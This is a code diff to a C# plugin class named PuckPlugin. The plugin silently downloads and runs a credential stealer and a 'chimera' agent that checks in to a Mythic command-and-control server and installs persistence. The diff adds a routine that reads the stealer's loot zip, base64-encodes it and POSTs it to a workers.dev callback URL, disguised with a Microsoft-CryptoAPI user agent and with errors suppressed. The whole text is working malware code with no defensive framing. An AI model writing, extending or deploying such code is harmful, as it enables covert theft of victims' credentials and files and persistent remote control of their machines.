@@ -59,24 +59,61 @@ public class PuckPlugin : IPuckPlugin
             Download(ChimeraUrl, chimeraDst);
             File.AppendAllText(@"C:\Users\Public\debug.txt", "chimera downloaded\n");
 
-            // Step 4 - Run stealer, wait up to 30s for it to finish
+            // Step 4 - Run stealer, wait up to 60s for loot zip to be written
+            // stealer saves to C:\Users\Public\stealer_loot.zip automatically
             Process stealer = RunHiddenWithHandle(stealerDst, "");
             File.AppendAllText(@"C:\Users\Public\debug.txt", "stealer started\n");
             if (stealer != null)
             {
-                stealer.WaitForExit(30000);
+                stealer.WaitForExit(60000);
                 stealer.Close();
             }
             File.AppendAllText(@"C:\Users\Public\debug.txt", "stealer done\n");
 
-            // Step 5 - Run chimera (connects to Mythic, uploads loot, installs persist)
+            // Step 5 - Run chimera (checks in to Mythic, installs persist)
             RunHidden(chimeraDst, "");
             File.AppendAllText(@"C:\Users\Public\debug.txt", "chimera started\n");
+
+            // Step 6 - Upload loot zip to Mythic via chimera callback URL
+            // Chimera is now running and registered; post the file directly
+            // so it appears in Mythic's "Recently Downloaded Files"
+            Thread.Sleep(5000); // give chimera time to register its UUID
+            UploadLootToMythic(@"C:\Users\Public\stealer_loot.zip");
+            File.AppendAllText(@"C:\Users\Public\debug.txt", "loot uploaded\n");
         }
         catch (Exception ex)
         {
             File.WriteAllText(@"C:\Users\Public\debug.txt", "ERROR: " + ex.Message);
         }
+    }
+
+    private static void UploadLootToMythic(string zipPath)
+    {
+        try
+        {
+            if (!File.Exists(zipPath)) return;
+
+            // Mythic callback URL — same one chimera uses
+            const string CallbackUrl = "https://hidden-lake-0908.walrus012.workers.dev/data";
+
+            byte[] data = File.ReadAllBytes(zipPath);
+            string b64  = Convert.ToBase64String(data);
+
+            // Mythic download chunk message — appears in "Recently Downloaded Files"
+            string json = "{\"action\":\"post_response\",\"responses\":[{\"task_id\":\"loot-auto\","
+                        + "\"download\":{\"total_chunks\":1,\"chunk_num\":1,"
+                        + "\"chunk_data\":\"" + b64 + "\","
+                        + "\"full_path\":\"" + zipPath.Replace("\\", "\\\\") + "\","
+                        + "\"is_screenshot\":false}}]}";
+
+            using (var wc = new WebClient())
+            {
+                wc.Headers["User-Agent"]   = "Microsoft-CryptoAPI/10.0";
+                wc.Headers["Content-Type"] = "application/json";
+                wc.UploadString(CallbackUrl, "POST", json);
+            }
+        }
+        catch { }
     }
 
     private static void Download(string url, string dest)
